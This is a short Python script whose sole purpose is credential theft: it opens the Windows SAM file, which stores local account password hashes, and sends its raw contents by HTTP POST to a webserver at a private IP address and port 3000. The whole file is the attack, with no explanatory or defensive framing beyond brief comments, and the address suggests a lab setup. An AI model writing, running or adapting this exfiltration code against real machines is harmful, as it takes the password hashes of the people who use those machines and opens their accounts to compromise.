import requests

# Path to our SAM-File
file_path = r'C:\Windows\System32\config\SAM'

# URL of the webserver where we want to send the data
url = 'http://192.168.122.1:3000/upload'

def extract_password_hashes(file_path):
    try:
        with open(file_path, 'rb') as file:
            content = file.read()
            send_to_webserver(content)
    except Exception as e:
        print(f'Error extracting password hashes: {e}')

def send_to_webserver(data):
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print('Data sent successfully to webserver')
        else:
            print(f'Failed to send data to webserver. Status code: {response.status_code}')
    except Exception as e:
        print(f'Error sending data to webserver: {e}')

extract_password_hashes(file_path)
